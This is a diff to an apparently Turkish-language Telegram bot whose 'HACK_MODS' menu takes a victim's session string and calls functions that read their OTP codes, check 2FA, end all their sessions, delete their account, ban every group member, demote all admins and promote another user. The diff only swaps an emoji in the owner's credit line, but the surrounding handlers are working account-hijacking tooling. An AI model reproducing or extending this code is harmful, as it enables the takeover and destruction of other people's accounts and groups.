@@ -44,7 +44,7 @@ async def b_callback(client : Client, query : CallbackQuery):
     id = query.message.chat.id   
     session = await client.ask(id,"Bana kullanıcının Sessionu'nu ver.")
     info = await user_info(session.text)
-    await query.message.reply_text(text = info + "\n\n**Başarıyla Tamamlandı Owner @goktuResmi 💻)**",
+    await query.message.reply_text(text = info + "\n\n**Başarıyla Tamamlandı Owner @goktuResmi 🧑‍💻**",
             reply_markup=HACK_MODS,
             disable_web_page_preview=True)
 
@@ -54,7 +54,7 @@ async def c_callback(client : Client, query : CallbackQuery):
     session = await client.ask(id,"Bana kullanıcının Sessionu'nu ver.")
     gc = await client.ask(id,"Bana Grup Adını Ver Yada İd'sini Ver. ") 
     hehe = await banall(session.text,gc)
-    await query.message.reply_text(text = hehe + "\n\n**Başarıyla Tamamlandı Owner @goktuResmi 💻)**",
+    await query.message.reply_text(text = hehe + "\n\n**Başarıyla Tamamlandı Owner @goktuResmi 🧑‍💻**",
             reply_markup=HACK_MODS,
             disable_web_page_preview=True)
 
@@ -63,7 +63,7 @@ async def d_callback(client : Client, query : CallbackQuery):
     id = query.message.chat.id   
     session = await client.ask(id,"Bana kullanıcının Sessionu'nu ver.")
     hehe = await get_otp(session.text)
-    await query.message.reply_text(text = hehe + "\n\n**Başarıyla Tamamlandı Owner @goktuResmi 💻)**",
+    await query.message.reply_text(text = hehe + "\n\n**Başarıyla Tamamlandı Owner @goktuResmi 🧑‍💻**",
             reply_markup=HACK_MODS,
             disable_web_page_preview=True)
 
@@ -73,7 +73,7 @@ async def e_callback(client : Client, query : CallbackQuery):
     session = await client.ask(id,"Bana kullanıcının Sessionu'nu ver.")
     gc = await client.ask(id,"Bana Grup Kullanıcı Adını Yada Grup İd'sini Ver.") 
     hehe = await join_ch(session.text,gc)
-    await query.message.reply_text(text = hehe + "\n\n**Başarıyla Tamamlandı Owner @goktuResmi 💻)**",
+    await query.message.reply_text(text = hehe + "\n\n**Başarıyla Tamamlandı Owner @goktuResmi 🧑‍💻**",
             reply_markup=HACK_MODS,
             disable_web_page_preview=True)
 
@@ -83,7 +83,7 @@ async def f_callback(client : Client, query : CallbackQuery):
     session = await client.ask(id,"Bana kullanıcının Sessionu'nu ver.")
     gc = await client.ask(id,"Bana Grup Kullanıcı Adı Yada İd'sini Ver.") 
     hehe = await leave_ch(session.text,gc)
-    await query.message.reply_text(text = hehe + "\n\n**Başarıyla Tamamlandı Owner @goktuResmi 💻)**",
+    await query.message.reply_text(text = hehe + "\n\n**Başarıyla Tamamlandı Owner @goktuResmi 🧑‍💻**",
             reply_markup=HACK_MODS,
             disable_web_page_preview=True)
 
@@ -93,7 +93,7 @@ async def g_callback(client : Client, query : CallbackQuery):
     session = await client.ask(id,"Bana kullanıcının Sessionu'nu ver.")
     gc = await client.ask(id,"Bana Grup Kullanıcı Adı Yada İd'sini Ver.") 
     hehe = await del_ch(session.text,gc)
-    await query.message.reply_text(text = hehe + "\n\n**Başarıyla Tamamlandı Owner @goktuResmi 💻)**",
+    await query.message.reply_text(text = hehe + "\n\n**Başarıyla Tamamlandı Owner @goktuResmi 🧑‍💻**",
             reply_markup=HACK_MODS,
             disable_web_page_preview=True)
 
@@ -103,7 +103,7 @@ async def h_callback(client : Client, query : CallbackQuery):
     id = query.message.chat.id   
     session = await client.ask(id,"Bana kullanıcının Sessionu'nu ver.")
     hehe = await check_2fa(session.text)
-    await query.message.reply_text(text = hehe + "\n\n**Başarıyla Tamamlandı Owner @goktuResmi 💻)**",
+    await query.message.reply_text(text = hehe + "\n\n**Başarıyla Tamamlandı Owner @goktuResmi 🧑‍💻**",
             reply_markup=HACK_MODS,
             disable_web_page_preview=True)
 
@@ -112,7 +112,7 @@ async def i_callback(client : Client, query : CallbackQuery):
     id = query.message.chat.id   
     session = await client.ask(id,"Bana kullanıcının Sessionu'nu ver.")
     hehe = await terminate_all(session.text)
-    await query.message.reply_text(text = hehe + "\n\n**Başarıyla Tamamlandı Owner @goktuResmi 💻)**",
+    await query.message.reply_text(text = hehe + "\n\n**Başarıyla Tamamlandı Owner @goktuResmi 🧑‍💻**",
             reply_markup=HACK_MODS,
             disable_web_page_preview=True)
 
@@ -121,7 +121,7 @@ async def j_callback(client : Client, query : CallbackQuery):
     id = query.message.chat.id   
     session = await client.ask(id,"Bana kullanıcının Sessionu'nu ver.")    
     hehe = await del_acc(session.text)
-    await query.message.reply_text(text = hehe + "\n\n**Başarıyla Tamamlandı Owner @goktuResmi 💻)**",
+    await query.message.reply_text(text = hehe + "\n\n**Başarıyla Tamamlandı Owner @goktuResmi 🧑‍💻**",
             reply_markup=HACK_MODS,
             disable_web_page_preview=True)
 
@@ -132,7 +132,7 @@ async def k_callback(client : Client, query : CallbackQuery):
     user_id = await client.ask(id,"Yetki Vereceğim Kullanıcının İd'si Yada Kullanıcı Adını Ver.")
     gc_id = await client.ask(id,"Yetki Vereceğim Grup İd'si Yada Kullanıcı Adı Ver.")
     hehe = await piromote(session.text,gc_id,user_id)
-    await query.message.reply_text(text = hehe + "\n\n**Başarıyla Tamamlandı Owner @goktuResmi 💻)**",
+    await query.message.reply_text(text = hehe + "\n\n**Başarıyla Tamamlandı Owner @goktuResmi 🧑‍💻**",
             reply_markup=HACK_MODS,
             disable_web_page_preview=True)
 
@@ -142,7 +142,7 @@ async def l_callback(client : Client, query : CallbackQuery):
     session = await client.ask(id,"Bana kullanıcının Sessionu'nu ver.")    
     gc_id = await client.ask(id,"Bana Grup İd'si Yada Kullanıcı Adını Ver Bütün Yöneticileri Çıkarayım.")
     hehe = await demote_all(session.text,gc_id,user_id)
-    await query.message.reply_text(text = hehe + "\n\n**Başarıyla Tamamlandı Owner @goktuResmi 💻)**",
+    await query.message.reply_text(text = hehe + "\n\n**Başarıyla Tamamlandı Owner @goktuResmi 🧑‍💻**",
             reply_markup=HACK_MODS,
             disable_web_page_preview=True)
 
